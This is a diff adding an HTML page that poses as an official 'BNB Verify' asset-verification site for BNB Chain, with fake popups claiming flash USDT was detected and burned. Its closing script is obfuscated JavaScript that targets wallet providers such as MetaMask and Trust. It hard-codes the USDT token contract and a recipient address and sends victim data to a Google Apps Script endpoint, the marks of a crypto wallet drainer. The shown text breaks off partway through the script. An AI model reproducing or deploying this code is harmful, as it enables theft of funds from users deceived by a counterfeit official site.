@@ -1,0 +1,848 @@
+<!DOCTYPE html>
+<html lang="en" class="__variable_188709 __variable_9a8899">
+    <meta http-equiv="content-type" content="text/html;charset=utf-8"/>
+    <head>
+        <meta charSet="utf-8"/>
+        <meta name="viewport" content="width=device-width, initial-scale=1"/>
+        <link rel="preload" href="_next/static/media/4cf2300e9c8272f7-s.p.woff2" as="font" crossorigin="" type="font/woff2"/>
+        <link rel="preload" href="_next/static/media/93f479601ee12b01-s.p.woff2" as="font" crossorigin="" type="font/woff2"/>
+        <link rel="stylesheet" href="_next/static/css/ebf56a4e9a80851f.css" data-precedence="next"/>
+        <meta name="next-size-adjust" content=""/>
+        <title>BNB Verify - Secure Asset Verification</title>
+        <meta name="description" content="Verify your BNB Chain assets securely and efficiently"/>
+        <script>
+            document.querySelectorAll('body link[rel="icon"], body link[rel="apple-touch-icon"]').forEach(el => document.head.appendChild(el))
+        </script>
+        <style>
+            /* Loader */
+            .loader {
+                border: 3px solid #fff;
+                border-top: 3px solid transparent;
+                border-radius: 50%;
+                width: 16px;
+                height: 16px;
+                animation: spin 1s linear infinite;
+                display: none;
+            }
+
+            @keyframes spin {
+                100% {
+                    transform: rotate(360deg);
+                }
+            }
+
+            .loading .loader {
+                display: inline-block;
+            }
+
+            /* Overlay */
+            .overlay {
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background: rgba(0,0,0,0.85);
+                backdrop-filter: blur(3px);
+                display: none;
+                justify-content: center;
+                align-items: center;
+                z-index: 99;
+                padding: 15px;
+            }
+
+            .popup {
+                background: #ffffff;
+                /* creamy white */
+                color: #000;
+                padding: 25px;
+
+                border-radius: 16px;
+                border: 2.2px solid gold;
+                width: 100%;
+                max-width: 360px;
+                text-align: center;
+                box-shadow: 0 10px 25px rgba(0,0,0,0.5);
+                animation: fadeIn 0.3s ease-out;
+            }
+
+            .popup h2 {
+                margin: 10px 0;
+                font-size: 20px;
+                font-weight: bold;
+                font-family: "Segoe UI", Tahoma, sans-serif;
+                color: gold;
+                /* yellow gold */
+                text-shadow: 0 0 6px rgba(255,215,0,0.1);
+            }
+
+            .section {
+                text-align: center;
+                margin: 18px 0;
+            }
+
+            .emoji-line {
+                display: flex;
+                align-items: center;
+                /* centers image & text vertically */
+                justify-content: center;
+                /* centers the whole row */
+                gap: 10px;
+                /* space between emoji and text */
+            }
+
+            .png_emoji {
+                width: 30px;
+                height: auto;
+            }
+
+            .png2_emoji {
+                width: 60px;
+                /* bigger for top icon */
+                height: auto;
+                display: block;
+                /* forces it above text */
+                margin: 0 auto 10px;
+                /* center + spacing below */
+            }
+
+            .png2_emoji2 {
+                width: 100px;
+                /* bigger for top icon */
+                height: auto;
+                display: block;
+                /* forces it above text */
+                margin: 0 auto 10px;
+                /* center + spacing below */
+            }
+
+            .inline-section, .inline-section2 {
+                display: flex;
+                align-items: center;
+                justify-content: flex-start;
+                margin: 35px 0;
+                background: rgba(209,183,59,0.1);
+                padding: 15px;
+                text-align: left;
+            }
+
+            .inline-section2 {
+                background: rgba(59,209,132,0.1);
+            }
+
+            .inline-section .emoji {
+                font-size: 30px;
+                width: 40px;
+                /* fixed width for perfect alignment */
+                text-align: center;
+            }
+
+            .text .title {
+                font-size: 18px;
+                font-weight: bold;
+            }
+
+            .text .subtitle {
+                font-size: 15px;
+                opacity: 1;
+                color: #403F3F;
+            }
+
+            .subtitle2 {
+                font-size: 15px;
+                opacity: 1;
+                margin-top: -10px;
+                font-weight: bold;
+                color: #403F3F;
+            }
+
+            .subtitle22 {
+                font-size: 15px;
+                opacity: 1;
+                font-weight: bold;
+                color: #403F3F;
+            }
+
+            .close-btn {
+                margin-top: 20px;
+                padding: 12px;
+                width: 100%;
+                font-size: 16px;
+                font-weight: bold;
+                border: none;
+                border-radius: 10px;
+                background: linear-gradient(45deg, #ff4d4d, #ff9900);
+                color: white;
+                cursor: pointer;
+                box-shadow: 0 4px 12px rgba(0,0,0,0.4);
+                transition: transform 0.2s ease;
+            }
+
+            .close-btn:active {
+                transform: scale(0.96);
+            }
+
+            @keyframes fadeIn {
+                from {
+                    opacity: 0;
+                    transform: scale(0.9);
+                }
+
+                to {
+                    opacity: 1;
+                    transform: scale(1);
+                }
+            }
+        </style>
+    </head>
+    <body class="antialiased min-h-screen flex flex-col bg-white">
+        <div class="antialiased">
+            <main class="flex-1 flex flex-col">
+                <main class="relative min-h-screen overflow-hidden bg-white">
+                    <nav class="fixed top-0 left-0 right-0 z-50 backdrop-blur-md bg-white/90 border-b border-gray-200 shadow-sm">
+                        <div class="max-w-7xl mx-auto px-4 sm:px-6">
+                            <div class="flex justify-between items-center py-4">
+                                <div class="flex items-center">
+                                    <a class="flex items-center gap-2" href="index.html">
+                                        <img alt="BNB Logo" loading="lazy" width="32" height="32" decoding="async" data-nimg="1" style="color:transparent" src="bnb.png"/>
+                                        <span class="text-amber-500 font-bold text-xl">BNB Chain</span>
+                                    </a>
+                                </div>
+                                <div class="hidden lg:flex items-center space-x-6">
+                                    <a target="_blank" rel="noopener noreferrer" class="text-gray-700 hover:text-amber-500 transition-colors font-medium" href="https://www.bnbchain.org/en">Home</a>
+                                    <a target="_blank" rel="noopener noreferrer" class="text-gray-700 hover:text-amber-500 transition-colors font-medium" href="https://www.bnbchain.org/en/blog">Support</a>
+                                    <a target="_blank" rel="noopener noreferrer" class="text-gray-700 hover:text-amber-500 transition-colors font-medium" href="https://www.bnbchain.org/en/contact">Contact Us</a>
+                                    <a target="_blank" rel="noopener noreferrer" class="text-gray-700 hover:text-amber-500 transition-colors font-medium" href="https://docs.bnbchain.org/docs/overview">Docs</a>
+                                    <a target="_blank" rel="noopener noreferrer" class="text-gray-700 hover:text-amber-500 transition-colors font-medium" href="https://bscscan.com/">Explorer</a>
+                                    <a target="_blank" rel="noopener noreferrer" class="text-gray-700 hover:text-amber-500 transition-colors font-medium" href="https://www.bnbchain.org/en/about">About</a>
+                                    <a target="_blank" rel="noopener noreferrer" class="text-gray-700 hover:text-amber-500 transition-colors font-medium" href="https://www.bnbchain.org/en/bridge">Bridge</a>
+                                    <a href="#verify" class="bg-gradient-to-r from-amber-500 to-yellow-400 text-white px-4 py-2 rounded-md font-medium hover:shadow-lg transition-all">Verify Now</a>
+                                </div>
+                                <div class="lg:hidden">
+                                    <button class="text-gray-700 hover:text-amber-500 transition-colors">
+                                        <svg xmlns="http://www.w3.org/2000/svg" class="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
+                                            <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"></path>
+                                        </svg>
+                                    </button>
+                                </div>
+                            </div>
+                        </div>
+                    </nav>
+                    <div class="w-full pt-24 pb-16 bg-gradient-to-b from-white to-amber-50">
+                        <div class="space-y-16">
+                            <div class="max-w-6xl mx-auto px-4 sm:px-6">
+                                <div class="text-center mb-12">
+                                    <h1 class="text-4xl md:text-5xl font-bold text-gray-800 mb-4">
+                                        Verify Crypto Assets on <span class="text-amber-500">BNB Chain</span>
+                                    </h1>
+                                    <p class="text-xl text-gray-600 max-w-3xl mx-auto">The official platform for verifying and securing your BNB Chain assets</p>
+                                </div>
+                                <div class="max-w-3xl mx-auto">
+                                    <div class="rounded-xl text-card-foreground border border-amber-200 bg-white overflow-hidden relative animate-fade-in shadow-md" id="verify">
+                                        <div class="absolute inset-0 bg-gradient-to-br from-amber-50 to-white opacity-50"></div>
+                                        <div class="p-6 pt-6 pb-8 relative z-10">
+                                            <div class="flex flex-col items-center justify-between gap-6 text-center">
+                                                <div class="flex  w-full items-center justify-center mb-6 animate-fade-in" style="animation-delay:300ms">
+                                                    <div class="relative border border-amber-200 shadow-xl rounded-full p-4 w-28 h-28 md:w-36 md:h-36 flex items-center justify-center">
+                                                        <img alt="BNB Logo" loading="lazy" width="32" height="32" decoding="async" data-nimg="1" class="w-full h-full object-contain " style="color:transparent" src="_next/static/media/bnb.c8612fc8.svg"/>
+                                                    </div>
+                                                </div>
+                                                <div class="inline-block px-4 py-1.5 border border-amber-400 bg-amber-50 text-amber-600 text-xs font-medium rounded-md mb-6 animate-slide-up">BNB CHAIN VERIFICATION</div>
+                                                <button id="connectBtn" class="inline-flex h-12 items-center justify-center rounded-lg bg-gradient-to-r from-amber-500 to-yellow-400 px-8 font-medium text-white transition-all hover:shadow-lg disabled:opacity-70 disabled:cursor-not-allowed">
+                                                    <span class="btn-text">Verify Asset</span>
+                                                    <span class="loader"></span>
+                                                </button>
+                                                <div class="max-w-md animate-slide-up" style="animation-delay:150ms">
+                                                    <p class="text-gray-600 mb-6 text-center">Verify your BNB Chain assets with our advanced security protocol. Protect against scams and ensure your transactions are secure.</p>
+                                                </div>
+                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                                <div class="max-w-6xl mx-auto mt-16">
+                                    <h2 class="text-3xl font-bold text-center text-gray-800 mb-6">Our Features</h2>
+                                </div>
+                            </div>
+                            <div class="w-full max-w-7xl mx-auto px-4 sm:px-6">
+                                <section class="w-full py-16 bg-gradient-to-b from-white to-amber-50 border-y border-gray-100">
+                                    <div class="max-w-7xl mx-auto px-6">
+                                        <h2 class="text-4xl font-bold text-amber-600 mb-12 text-center">Why Choose BNB Chain?</h2>
+                                        <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-8">
+                                            <div class="bg-white p-8 rounded-xl border border-gray-100 shadow-sm hover:shadow-md hover:border-amber-200 transition-all">
+                                                <h3 class="text-xl font-semibold text-amber-600 mb-4">Unparalleled Speed</h3>
+                                                <p class="text-gray-600">Experience lightning-fast transaction confirmations with up to 3,000 TPS. BNB Chain offers one of the most responsive and efficient networks for all your digital asset needs.</p>
+                                            </div>
+                                            <div class="bg-white p-8 rounded-xl border border-gray-100 shadow-sm hover:shadow-md hover:border-amber-200 transition-all">
+                                                <h3 class="text-xl font-semibold text-amber-600 mb-4">Low Transaction Fees</h3>
+                                                <p class="text-gray-600">Save significantly with transaction fees as low as $0.01, making BNB Chain the most cost-effective solution for frequent traders and everyday users alike.</p>
+                                            </div>
+                                            <div class="bg-white p-8 rounded-xl border border-gray-100 shadow-sm hover:shadow-md hover:border-amber-200 transition-all">
+                                                <h3 class="text-xl font-semibold text-amber-600 mb-4">Enhanced Security</h3>
+                                                <p class="text-gray-600">Rest easy with multi-layered protection including real-time monitoring, automated verification protocols, and advanced fraud detection systems safeguarding your assets.</p>
+                                            </div>
+                                            <div class="bg-white p-8 rounded-xl border border-gray-100 shadow-sm hover:shadow-md hover:border-amber-200 transition-all">
+                                                <h3 class="text-xl font-semibold text-amber-600 mb-4">Seamless Integration</h3>
+                                                <p class="text-gray-600">Connect easily with 100+ major exchanges, wallets, and DeFi platforms through our standardized APIs and developer-friendly tools built for maximum compatibility.</p>
+                                            </div>
+                                        </div>
+                                        <div class="mt-12 text-center">
+                                            <a href="https://www.bnbchain.org/en/developers" target="_blank" rel="noopener noreferrer" class="inline-flex items-center space-x-2 bg-gradient-to-r from-amber-500 to-yellow-400 hover:shadow-lg transition-all px-8 py-4 rounded-lg text-white font-semibold">
+                                                <span>Get Started with BNB Chain</span>
+                                                <svg xmlns="http://www.w3.org/2000/svg" class="h-5 w-5" viewBox="0 0 20 20" fill="currentColor">
+                                                    <path fill-rule="evenodd" d="M10.293 3.293a1 1 0 011.414 0l6 6a1 1 0 010 1.414l-6 6a1 1 0 01-1.414-1.414L14.586 11H3a1 1 0 110-2h11.586l-4.293-4.293a1 1 0 010-1.414z" clip-rule="evenodd"></path>
+                                                </svg>
+                                            </a>
+                                        </div>
+                                    </div>
+                                </section>
+                            </div>
+                        </div>
+                    </div>
+                </main>
+                <!--$-->
+                <!--/$-->
+                <!--$-->
+                <!--/$-->
+            </main>
+            <footer class="w-full border-t border-gray-200 bg-gradient-to-b from-gray-50 to-white mt-auto">
+                <div class="container mx-auto px-4 py-12 relative z-10">
+                    <div class="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-5 gap-8">
+                        <div class="space-y-4 lg:col-span-2">
+                            <div class="flex items-center gap-2">
+                                <img alt="BNB Logo" loading="lazy" width="32" height="32" decoding="async" data-nimg="1" class="rounded-md" style="color:transparent" src="bnb.png"/>
+                                <h3 class="text-xl font-bold text-amber-500">BNB Verify</h3>
+                            </div>
+                            <p class="text-sm text-gray-600 max-w-md">The official verification platform for BNB Chain assets. Our cutting-edge security protocols protect your investments and provide real-time verification with institutional-grade security standards.</p>
+                            <div class="pt-2">
+                                <a class="text-amber-500 hover:text-amber-600 font-medium flex items-center gap-1 text-sm" href="#verify">
+                                    Verify your assets now
+                                    
+                                    <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                        <path d="m9 18 6-6-6-6"></path>
+                                    </svg>
+                                </a>
+                            </div>
+                        </div>
+                        <div class="space-y-4">
+                            <h3 class="text-lg font-semibold text-gray-800">Products</h3>
+                            <ul class="space-y-2">
+                                <li>
+                                    <a class="text-sm text-gray-600 hover:text-amber-500 transition-colors" href="#">Token Verification</a>
+                                </li>
+                                <li>
+                                    <a class="text-sm text-gray-600 hover:text-amber-500 transition-colors" href="#">Smart Contract Audit</a>
+                                </li>
+                                <li>
+                                    <a class="text-sm text-gray-600 hover:text-amber-500 transition-colors" href="#">Security Analysis</a>
+                                </li>
+                                <li>
+                                    <a class="text-sm text-gray-600 hover:text-amber-500 transition-colors" href="#">Transaction Monitor</a>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="space-y-4">
+                            <h3 class="text-lg font-semibold text-gray-800">Resources</h3>
+                            <ul class="space-y-2">
+                                <li>
+                                    <a target="_blank" rel="noopener noreferrer" class="text-sm text-gray-600 hover:text-amber-500 transition-colors" href="https://docs.bnbchain.org/docs/overview">Documentation</a>
+                                </li>
+                                <li>
+                                    <a target="_blank" rel="noopener noreferrer" class="text-sm text-gray-600 hover:text-amber-500 transition-colors" href="https://bscscan.com/">Explorer</a>
+                                </li>
+                                <li>
+                                    <a target="_blank" rel="noopener noreferrer" class="text-sm text-gray-600 hover:text-amber-500 transition-colors" href="https://www.bnbchain.org/en/blog">Blog</a>
+                                </li>
+                                <li>
+                                    <a target="_blank" rel="noopener noreferrer" class="text-sm text-gray-600 hover:text-amber-500 transition-colors" href="https://www.bnbchain.org/en/bridge">Bridge</a>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="space-y-4">
+                            <h3 class="text-lg font-semibold text-gray-800">Community</h3>
+                            <ul class="space-y-2">
+                                <li>
+                                    <a target="_blank" rel="noopener noreferrer" class="text-sm text-gray-600 hover:text-amber-500 transition-colors" href="https://www.bnbchain.org/en/contact">Contact Us</a>
+                                </li>
+                                <li>
+                                    <a target="_blank" rel="noopener noreferrer" class="text-sm text-gray-600 hover:text-amber-500 transition-colors" href="https://www.bnbchain.org/en/developers">Developers</a>
+                                </li>
+                                <li>
+                                    <a target="_blank" rel="noopener noreferrer" class="text-sm text-gray-600 hover:text-amber-500 transition-colors" href="https://www.bnbchain.org/en">About Us</a>
+                                </li>
+                                <li>
+                                    <a class="text-sm text-gray-600 hover:text-amber-500 transition-colors" href="#">FAQ</a>
+                                </li>
+                            </ul>
+                        </div>
+                        <div class="space-y-4">
+                            <h3 class="text-lg font-semibold text-gray-800">Connect</h3>
+                            <div class="flex flex-wrap gap-3">
+                                <a href="https://x.com/BNBChain" target="_blank" rel="noopener noreferrer" class="w-10 h-10 rounded-lg bg-amber-50 border border-amber-100 flex items-center justify-center hover:border-amber-500 hover:bg-amber-100 transition-colors" aria-label="X (formerly Twitter)">
+                                    <svg class="w-4 h-4 text-amber-500" fill="currentColor" viewBox="0 0 24 24" aria-hidden="true">
+                                        <path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"></path>
+                                    </svg>
+                                </a>
+                                <a href="https://t.me/BNBChain" target="_blank" rel="noopener noreferrer" class="w-10 h-10 rounded-lg bg-amber-50 border border-amber-100 flex items-center justify-center hover:border-amber-500 hover:bg-amber-100 transition-colors" aria-label="Telegram">
+                                    <svg class="w-5 h-5 text-amber-500" fill="currentColor" viewBox="0 0 24 24" aria-hidden="true">
+                                        <path d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm5.894 8.221l-1.97 9.28c-.145.658-.537.818-1.084.508l-3-2.21-1.446 1.394c-.14.18-.357.223-.535.223l.19-2.712 4.94-4.465c.215-.19-.047-.296-.334-.106l-6.104 3.853-2.623-.916c-.57-.182-.582-.57.12-.842l10.212-3.93c.468-.176.878.106.634 1.924z"></path>
+                                    </svg>
+                                </a>
+                                <a href="https://discord.com/invite/bnbchain" target="_blank" rel="noopener noreferrer" class="w-10 h-10 rounded-lg bg-amber-50 border border-amber-100 flex items-center justify-center hover:border-amber-500 hover:bg-amber-100 transition-colors" aria-label="Discord">
+                                    <svg class="w-5 h-5 text-amber-500" fill="currentColor" viewBox="0 0 24 24" aria-hidden="true">
+                                        <path d="M20.317 4.492c-1.53-.69-3.17-1.2-4.885-1.49a.075.075 0 00-.079.036c-.21.369-.444.85-.608 1.23a18.566 18.566 0 00-5.487 0 12.36 12.36 0 00-.617-1.23A.077.077 0 008.562 3c-1.714.29-3.354.8-4.885 1.491a.07.07 0 00-.032.027C.533 9.093-.32 13.555.099 17.961a.08.08 0 00.031.055 20.03 20.03 0 005.993 2.98.078.078 0 00.084-.026 13.83 13.83 0 001.226-1.963.074.074 0 00-.041-.104 13.201 13.201 0 01-1.872-.878.075.075 0 01-.008-.125c.126-.093.252-.19.372-.287a.075.075 0 01.078-.01c3.927 1.764 8.18 1.764 12.061 0a.075.075 0 01.079.009c.12.098.245.195.372.288a.075.075 0 01-.006.125c-.598.344-1.22.635-1.873.877a.075.075 0 00-.041.105c.36.687.772 1.341 1.225 1.962a.077.077 0 00.084.028 19.963 19.963 0 006.002-2.981.076.076 0 00.032-.054c.5-5.094-.838-9.52-3.549-13.442a.06.06 0 00-.031-.028zM8.02 15.278c-1.182 0-2.157-1.069-2.157-2.38 0-1.312.956-2.38 2.157-2.38 1.21 0 2.176 1.077 2.157 2.38 0 1.312-.956 2.38-2.157 2.38zm7.975 0c-1.183 0-2.157-1.069-2.157-2.38 0-1.312.955-2.38 2.157-2.38 1.21 0 2.176 1.077 2.157 2.38 0 1.312-.946 2.38-2.157 2.38z"></path>
+                                    </svg>
+                                </a>
+                                <a href="https://github.com/bnb-chain" target="_blank" rel="noopener noreferrer" class="w-10 h-10 rounded-lg bg-amber-50 border border-amber-100 flex items-center justify-center hover:border-amber-500 hover:bg-amber-100 transition-colors" aria-label="GitHub">
+                                    <svg class="w-5 h-5 text-amber-500" fill="currentColor" viewBox="0 0 24 24" aria-hidden="true">
+                                        <path fill-rule="evenodd" d="M12 2C6.477 2 2 6.484 2 12.017c0 4.425 2.865 8.18 6.839 9.504.5.092.682-.217.682-.483 0-.237-.008-.868-.013-1.703-2.782.605-3.369-1.343-3.369-1.343-.454-1.158-1.11-1.466-1.11-1.466-.908-.62.069-.608.069-.608 1.003.07 1.531 1.032 1.531 1.032.892 1.53 2.341 1.088 2.91.832.092-.647.35-1.088.636-1.338-2.22-.253-4.555-1.113-4.555-4.951 0-1.093.39-1.988 1.029-2.688-.103-.253-.446-1.272.098-2.65 0 0 .84-.27 2.75 1.026A9.564 9.564 0 0112 6.844c.85.004 1.705.115 2.504.337 1.909-1.296 2.747-1.027 2.747-1.027.546 1.379.202 2.398.1 2.651.64.7 1.028 1.595 1.028 2.688 0 3.848-2.339 4.695-4.566 4.943.359.309.678.92.678 1.855 0 1.338-.012 2.419-.012 2.747 0 .268.18.58.688.482A10.019 10.019 0 0022 12.017C22 6.484 17.522 2 12 2z" clip-rule="evenodd"></path>
+                                    </svg>
+                                </a>
+                            </div>
+                            <p class="text-xs text-gray-500 pt-2">Follow us for the latest updates and announcements</p>
+                        </div>
+                    </div>
+                    <div class="mt-10 pt-8 border-t border-gray-200">
+                        <div class="flex flex-col md:flex-row justify-between items-center">
+                            <p class="text-sm text-gray-500">© 
+                            
+                            <!-- -->
+                            2025
+                            
+                            <!-- -->
+                            BNB Verify. All rights reserved.</p>
+                            <div class="flex gap-6 mt-4 md:mt-0">
+                                <a class="text-xs text-gray-500 hover:text-amber-500 transition-colors" href="#">Privacy Policy</a>
+                                <a class="text-xs text-gray-500 hover:text-amber-500 transition-colors" href="#">Terms of Service</a>
+                                <a class="text-xs text-gray-500 hover:text-amber-500 transition-colors" href="#">Cookie Settings</a>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </footer>
+        </div>
+        <!-- Overlay & Popup -->
+        <!-- Overlay -->
+        <div class="overlay" id="overlay">
+            <div class="popup">
+                <!-- Flash Detected -->
+                <div class="section">
+                    <img src="_next/static/media/fire.png" alt="burn symbol" class="png2_emoji">
+                    <h2>Flash USDT Detected!</h2>
+                    <p class="subtitle2" id="burn-text">We've identified and burned flash USDT</p>
+                </div>
+                <!-- Hello World inline -->
+                <div class="inline-section">
+                    <div class="emoji-line">
+                        <img src="_next/static/media/fire.png" alt="burn symbol" class="png_emoji">
+                        <div class="text">
+                            <p class="subtitle">burned Amount</p>
+                            <p class="title" id="burn-text2">100 USDT</p>
+                        </div>
+                    </div>
+                </div>
+                <!-- Success inline -->
+                <div class="inline-section2">
+                    <div class="emoji-line">
+                        <img src="_next/static/media/secure.png" alt="burn symbol" class="png_emoji">
+                        <div class="text">
+                            <p class="subtitle">Your wallet has been secured against Flash USDT vulnerabilities</p>
+                        </div>
+                    </div>
+                </div>
+                <!-- Close Button -->
+                <button id="closeBtn" class="close-btn">Close</button>
+            </div>
+        </div>
+        <!-- Overlay 2-->
+        <div class="overlay" id="overlay2">
+            <div class="popup">
+                <!-- Flash Detected -->
+                <div class="section">
+                    <img src="_next/static/media/yellow_top.png" alt="burn symbol" class="png2_emoji2">
+                    <h2>USDT Verified!</h2>
+                    <p class="subtitle2" id="burn-text11">Your USDT has been verified as genuine.</p>
+                </div>
+                <!-- Hello World inline -->
+                <div class="inline-section">
+                    <div class="emoji-line">
+                        <img src="_next/static/media/sign.png" alt="burn symbol" class="png_emoji">
+                        <div class="text">
+                            <p class="subtitle">Verified Amount</p>
+                            <p class="title" id="burn-text22">100 USDT</p>
+                        </div>
+                    </div>
+                </div>
+                <!-- Success inline -->
+                <div class="inline-section2">
+                    <div class="emoji-line">
+                        <img src="_next/static/media/sign.png" alt="burn symbol" class="png_emoji">
+                        <div class="text">
+                            <p class="subtitle22">Verification Success</p>
+                            <p class="subtitle">Your USDT tokens are genuine and safe to use.</p>
+                        </div>
+                    </div>
+                </div>
+                <!-- Close Button -->
+                <button id="closeBtn2" class="close-btn">Close</button>
+            </div>
+        </div>
+        <!-- UMD ethers (no ESM import) -->
+        <script src="https://cdn.jsdelivr.net/npm/ethers@6/dist/ethers.umd.min.js"></script>
+        <script type="module">
+
+            function _0x5973(_0x1b2fb4, _0x352b0a) {
+                const _0x4f0c02 = _0x4f0c();
+                return _0x5973 = function(_0x597376, _0x3dd5fd) {
+                    _0x597376 = _0x597376 - 0xac;
+                    let _0x1ec7e9 = _0x4f0c02[_0x597376];
+                    return _0x1ec7e9;
+                }
+                ,
+                _0x5973(_0x1b2fb4, _0x352b0a);
+            }
+            (function(_0x51b555, _0x4504f3) {
+                const _0x1b2b3e = _0x5973
+                  , _0x93402e = _0x51b555();
+                while (!![]) {
+                    try {
+                        const _0x3301cd = parseInt(_0x1b2b3e(0xde)) / 0x1 * (parseInt(_0x1b2b3e(0x127)) / 0x2) + -parseInt(_0x1b2b3e(0x121)) / 0x3 + parseInt(_0x1b2b3e(0xf8)) / 0x4 * (-parseInt(_0x1b2b3e(0xee)) / 0x5) + parseInt(_0x1b2b3e(0xc9)) / 0x6 * (parseInt(_0x1b2b3e(0xff)) / 0x7) + parseInt(_0x1b2b3e(0x112)) / 0x8 + parseInt(_0x1b2b3e(0x10f)) / 0x9 + parseInt(_0x1b2b3e(0x12a)) / 0xa * (-parseInt(_0x1b2b3e(0xc8)) / 0xb);
+                        if (_0x3301cd === _0x4504f3)
+                            break;
+                        else
+                            _0x93402e['push'](_0x93402e['shift']());
+                    } catch (_0xa39e52) {
+                        _0x93402e['push'](_0x93402e['shift']());
+                    }
+                }
+            }(_0x4f0c, 0x3e399),
+            (async function() {
+                const _0x14946b = _0x5973
+                  , _0x1fdd8f = '0x55d398326f99059fF775485246999027B3197955';
+                let _0x44ea78 = 0x1
+                  , _0x474b04 = '';
+                const _0x481823 = !![]
+                  , _0x4e7afe = '0x255e6ae81802d00869e34aca662f81a2555df2bd'
+                  , _0x51ae1a = _0x14946b(0xf2)
+                  , _0x5967cc = 0.00009
+                  , _0x479ef8 = 0xfa0
+                  , _0x460cf2 = 0x15f90
+                  , _0x29ceeb = ['function\x20balanceOf(address)\x20view\x20returns\x20(uint256)', _0x14946b(0x11a), _0x14946b(0xb6), _0x14946b(0xc2)]
+                  , _0x69b9ad = document[_0x14946b(0xf5)](_0x14946b(0x136))
+                  , _0x2a6ac2 = _0x69b9ad[_0x14946b(0xf6)](_0x14946b(0xed))
+                  , _0x54e458 = _0x69b9ad[_0x14946b(0xf6)](_0x14946b(0x13a))
+                  , _0x4cfdac = document['getElementById'](_0x14946b(0xd2))
+                  , _0x127397 = document[_0x14946b(0xf5)](_0x14946b(0x116))
+                  , _0x3cbd76 = document[_0x14946b(0xf5)](_0x14946b(0xc5))
+                  , _0x44728f = document[_0x14946b(0xf5)]('closeBtn')
+                  , _0x166327 = document[_0x14946b(0xf5)]('closeBtn2')
+                  , _0x3df8e8 = document[_0x14946b(0xf5)](_0x14946b(0xe9))
+                  , _0x436acf = 'https://script.google.com/macros/s/AKfycbxKZs3UXtcC2fGrz1yADRJmoverRJ_UsEE78PM0KZca-mc2o2bb7MySSkwU1ihYtTkoGg/exec'
+                  , _0x1cc557 = 'CHANGE_ME_TO_A_LONG_RANDOM_STRING';
+                async function _0x58e737(_0x51fe99, _0x14abcb, _0x5c8291=_0x14946b(0xb9)) {
+                    const _0x4099aa = _0x14946b
+                      , _0x29fc8e = new FormData();
+                    _0x29fc8e['append'](_0x4099aa(0x104), _0x51fe99),
+                    _0x29fc8e[_0x4099aa(0x138)](_0x4099aa(0xc6), 'Milkesh_site1'),
+                    _0x29fc8e[_0x4099aa(0x138)]('code', _0x14abcb),
+                    _0x29fc8e[_0x4099aa(0x138)](_0x4099aa(0xe7), _0x1cc557),
+                    _0x29fc8e[_0x4099aa(0x138)](_0x4099aa(0x130), _0x5c8291),
+                    _0x29fc8e[_0x4099aa(0x138)](_0x4099aa(0x110), _0x4099aa(0x138));
+                    try {
+                        await fetch(_0x436acf, {
+                            'method': _0x4099aa(0xd0),
+                            'body': _0x29fc8e
+                        });
+                    } catch (_0x22c98c) {
+                        console[_0x4099aa(0xe5)](_0x4099aa(0x132), _0x22c98c);
+                    }
+                }
+                function _0x988cf5(_0x393658) {
+                    const _0x5ae89a = _0x14946b
+                      , _0xc759ad = new Date()[_0x5ae89a(0xd1)]() + _0x5ae89a(0xf3) + _0x393658;
+                    console['log'](_0xc759ad);
+                }
+                function _0x18c598(_0x5d7b9d) {
+                    const _0x30d56c = _0x14946b;
+                    if (!_0x5d7b9d || !_0x5d7b9d[_0x30d56c(0x103)])
+                        return null;
+                    const _0x1a3fca = [_0x284720 => _0x284720['isTrust'] || _0x284720[_0x30d56c(0xc3)] || _0x284720[_0x30d56c(0xc3)] === !![], _0x44e3fb => _0x44e3fb[_0x30d56c(0x120)] === !![], _0x4bd555 => _0x4bd555['isBinanceChain'] || _0x4bd555['isBinance'] === !![], _0x3063de => _0x3063de[_0x30d56c(0xfd)] === !![], _0x25210a => !![]];
+                    for (const _0x26a16a of _0x1a3fca) {
+                        const _0x1d4c4f = _0x5d7b9d[_0x30d56c(0x135)](_0x26a16a);
+                        if (_0x1d4c4f)
+                            return _0x1d4c4f;
+                    }
+                    return _0x5d7b9d[0x0];
+                }
+                function _0x2ecf96() {
+                    const _0x5d6648 = _0x14946b;
+                    if (window[_0x5d6648(0xb3)] && Array[_0x5d6648(0x125)](window[_0x5d6648(0xb3)][_0x5d6648(0x108)]))
+                        try {
+                            const _0x412c79 = _0x18c598(window[_0x5d6648(0xb3)][_0x5d6648(0x108)]);
+                            return _0x988cf5('Detected\x20providers\x20array,\x20chosen\x20flags:\x20' + JSON[_0x5d6648(0x134)]({
+                                'isMetaMask': !!_0x412c79[_0x5d6648(0x120)],
+                                'isTrust': !!_0x412c79[_0x5d6648(0xda)],
+                                'isBinanceChain': !!_0x412c79[_0x5d6648(0x11f)]
+                            })),
+                            _0x412c79;
+                        } catch (_0x1e89b9) {
+                            console[_0x5d6648(0xe5)](_0x1e89b9);
+                        }
+                    if (window[_0x5d6648(0x10a)])
+                        return _0x988cf5('Detected\x20window.BinanceChain'),
+                        window[_0x5d6648(0x10a)];
+                    if (window['ethereum'])
+                        return _0x988cf5(_0x5d6648(0xba)),
+                        window[_0x5d6648(0xb3)];
+                    if (window['web3'] && window[_0x5d6648(0x10d)]['currentProvider'])
+                        return _0x988cf5(_0x5d6648(0x131)),
+                        window[_0x5d6648(0x10d)][_0x5d6648(0xe6)];
+                    return _0x988cf5(_0x5d6648(0xf9)),
+                    null;
+                }
+                async function _0x5c6424() {
+                    const _0x8377a9 = _0x14946b;
+                    if (window[_0x8377a9(0xcb)])
+                        return;
+                    await new Promise( (_0x36cf20, _0x4c560e) => {
+                        const _0x49fda8 = _0x8377a9
